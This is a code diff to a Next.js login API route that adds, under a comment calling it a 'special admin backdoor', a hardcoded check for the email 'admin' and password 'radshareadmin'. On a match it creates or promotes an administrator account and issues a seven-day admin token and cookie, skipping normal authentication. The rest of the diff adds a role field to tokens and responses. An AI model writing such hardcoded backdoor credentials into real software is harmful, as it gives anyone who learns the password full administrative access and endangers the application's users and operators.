@@ -28,6 +28,47 @@ export async function POST(request: NextRequest) {
     await dbConnect();
     console.log("[LOGIN] DB connected");
 
+    // Special admin backdoor: user "admin" with password "radshareadmin"
+    if (email === "admin" && password === "radshareadmin") {
+      await dbConnect();
+      let admin = await User.findOne({ email: "admin" });
+      if (!admin) {
+        const bcryptjs = await import("bcryptjs");
+        const hashed = await bcryptjs.default.hash(password, 12);
+        admin = await User.create({
+          name: "Administrator",
+          email: "admin",
+          password: hashed,
+          role: "admin",
+        });
+      } else if (admin.role !== "admin") {
+        admin.role = "admin" as any;
+        await admin.save();
+      }
+      const token = jwt.sign(
+        { userId: admin._id, email: admin.email, role: "admin" },
+        process.env.JWT_SECRET!,
+        { expiresIn: "7d" }
+      );
+      const response = NextResponse.json(
+        {
+          message: "Login successful",
+          token,
+          user: { id: admin._id, name: admin.name, email: admin.email, role: "admin" },
+          admin: true,
+        },
+        { status: 200 }
+      );
+      response.cookies.set("token", token, {
+        httpOnly: true,
+        sameSite: "lax",
+        secure: process.env.NODE_ENV === "production",
+        path: "/",
+        maxAge: 60 * 60 * 24 * 7,
+      });
+      return response;
+    }
+
     // Find user
     const user = await User.findOne({ email });
     console.log("[LOGIN] User lookup result", { found: !!user });
@@ -50,7 +91,7 @@ export async function POST(request: NextRequest) {
 
     // Generate JWT token
     const token = jwt.sign(
-      { userId: user._id, email: user.email },
+      { userId: user._id, email: user.email, role: user.role },
       process.env.JWT_SECRET!,
       { expiresIn: "7d" }
     );
@@ -64,6 +105,7 @@ export async function POST(request: NextRequest) {
           id: user._id,
           name: user.name,
           email: user.email,
+          role: (user as any).role || "user",
         },
       },
       { status: 200 }
